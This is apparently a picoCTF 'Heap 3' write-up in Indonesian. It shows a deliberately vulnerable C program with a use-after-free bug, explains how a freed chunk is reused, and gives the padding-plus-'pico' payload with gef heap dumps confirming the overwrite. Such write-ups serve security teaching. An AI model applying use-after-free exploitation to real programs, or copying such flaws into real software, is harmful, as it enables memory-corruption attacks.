# Heap 3
## Probset
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FLAGSIZE_MAX 64

// Create struct
typedef struct {
  char a[10];
  char b[10];
  char c[10];
  char flag[5];
} object;

int num_allocs;
object *x;

void check_win() {
  if(!strcmp(x->flag, "pico")) {
    printf("YOU WIN!!11!!\n");

    // Print flag
    char buf[FLAGSIZE_MAX];
    FILE *fd = fopen("flag.txt", "r");
    fgets(buf, FLAGSIZE_MAX, fd);
    printf("%s\n", buf);
    fflush(stdout);

    exit(0);

  } else {
    printf("No flage for u :(\n");
    fflush(stdout);
  }
  // Call function in struct
}

void print_menu() {
    printf("\n1. Print Heap\n2. Allocate object\n3. Print x->flag\n4. Check for win\n5. Free x\n6. "
           "Exit\n\nEnter your choice: ");
    fflush(stdout);
}

// Create a struct
void init() {

    printf("\nfreed but still in use\nnow memory untracked\ndo you smell the bug?\n");
    fflush(stdout);

    x = malloc(sizeof(object));
    strncpy(x->flag, "bico", 5);
}

void alloc_object() {
    printf("Size of object allocation: ");
    fflush(stdout);
    int size = 0;
    scanf("%d", &size);
    char* alloc = malloc(size);
    printf("Data for flag: ");
    fflush(stdout);
    scanf("%s", alloc);
}

void free_memory() {
    free(x);
}

void print_heap() {
    printf("[*]   Address   ->   Value   \n");
    printf("+-------------+-----------+\n");
    printf("[*]   %p  ->   %s\n", x->flag, x->flag);
    printf("+-------------+-----------+\n");
    fflush(stdout);
}

int main(void) {

    // Setup
    init();

    int choice;

    while (1) {
        print_menu();
	if (scanf("%d", &choice) != 1) exit(0);

        switch (choice) {
        case 1:
            // print heap
            print_heap();
            break;
        case 2:
            alloc_object();
            break;
        case 3:
            // print x
            printf("\n\nx = %s\n\n", x->flag);
            fflush(stdout);
            break;
        case 4:
            // Check for win condition
            check_win();
            break;
        case 5:
            free_memory();
            break;
        case 6:
            // exit
            return 0;
        default:
            printf("Invalid choice\n");
            fflush(stdout);
        }
    }
}

```

## Diketahui
Kita bisa mendapatkan hanya jika kita bisa mengubah alamat yang ditunjuk oleh x->flag berubah nilainya dari "bico" ke "pico", akan tetapi satu-satunya cara kita mengubah heap melalui fungsi alloc_object(). Sehingga, ada beberapa hal yang kita bisa rumuskan: 
* Mengubah heap dengan alloc_object yang didalamnya terdapat fungsi malloc()
* Terdapat free_memory() yang membebaskan memori x
* Suatu memori yang dialokasikan lalu dibebaskan akan digunakan lagi jika terdapat alokasi memori dengan jumlah size yang serupa
## Solusi
Kita free alamat x, alokasikan memori dengan size 35, isi nilai x dengan karakter padding acak sebesar 30, lalu pico. Sehingga payloadnya akan seperti ini:
```
Aa0Bb1Cc2Dd3Ee4Ff5Gg6Hh7Ii8Jj9pico
```

```
gef➤  heap chunks
Chunk(addr=0x405010, size=0x410, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000000405010     45 6e 74 65 72 20 79 6f 75 72 20 63 68 6f 69 63    Enter your choic]
Chunk(addr=0x405420, size=0x30, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000000405420     41 61 30 42 62 31 43 63 32 44 64 33 45 65 34 46    Aa0Bb1Cc2Dd3Ee4F]
Chunk(addr=0x405450, size=0x410, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000000405450     41 61 30 42 62 31 43 63 32 44 64 33 45 65 34 46    Aa0Bb1Cc2Dd3Ee4F]
Chunk(addr=0x405860, size=0x300, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000000405860     10 00 10 00 10 00 10 00 10 00 10 00 10 00 10 00    ................]
Chunk(addr=0x405b60, size=0x204b0, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000000405b60     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
gef➤  hexdump byte 0x405420 --size 48
0x0000000000405420     41 61 30 42 62 31 43 63 32 44 64 33 45 65 34 46    Aa0Bb1Cc2Dd3Ee4F
0x0000000000405430     66 35 47 67 36 48 68 37 49 69 38 4a 6a 39 70 69    f5Gg6Hh7Ii8Jj9pi
0x0000000000405440     63 6f 00 00 00 00 00 00 11 04 00 00 00 00 00 00    co..............

```